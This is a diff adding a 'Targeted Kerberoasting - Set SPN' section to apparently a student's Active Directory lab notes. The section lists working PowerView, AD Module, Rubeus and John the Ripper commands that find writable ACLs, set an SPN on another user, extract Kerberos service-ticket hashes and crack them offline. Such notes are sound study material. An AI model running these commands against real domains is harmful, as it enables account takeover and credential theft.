@@ -8,6 +8,7 @@
   - [Password Cracking - John the Ripper](#password-cracking---john-the-ripper)
   - [Password Cracking - tgsrepcrack](#password-cracking---tgsrepcrack)
   - [Password Cracking - Hashcat](#password-cracking---hashcat)
+  - [Targeted Kerberoasting - Set SPN](#targeted-kerberoasting---set-spn)
 
 ---
 
@@ -177,3 +178,64 @@ hashcat.exe -m 13100 -a 0 .\ToBeCracked\hashes.txt .\wordlists\10k-worst-pass.tx
 <br/>
 
 ---
+
+## Targeted Kerberoasting - Set SPN
+
+If we have sufficient rights (`GenericAll` / `GenericWrite`), a target user's SPN can be set to anything (unique to the domain). We can then request a TGS without special privilege. The TGS can then be "Kerberoasted".
+
+<br/>
+
+Remember the permissions we enumerated for our current user **studentuserx**:
+
+- PowerView
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuser"}
+```
+
+<br/>
+
+Then check if the user has SPN set:
+
+- PowerView
+
+```
+Get-DomainUser -Identity support64user | Select ServicePrincipalName
+```
+
+- AD Module
+
+```
+Get-ADUser -Identity Support64User -Properties ServicePrincipalName | Select ServicePrincipalName
+```
+
+<br/>
+
+Set SPN for the user. The SPN has to be unique in the domain.
+
+- PowerView
+
+```
+Set-DomainObject -Identity support64user -Set @{serviceprincipalname='us/myspn64'}
+```
+
+- AD Module
+
+```
+Set-ADUser -Identity support64user -ServicePrincipalNames @{Add='us/myspn64'}
+```
+
+<br/>
+
+Kerberoast the user finally:
+
+```
+Rubeus.exe kerberoast /outfile:kerberoast-hashes.txt
+```
+
+```
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\kerberoast-hashes.txt
+```
+
+<br/>
+
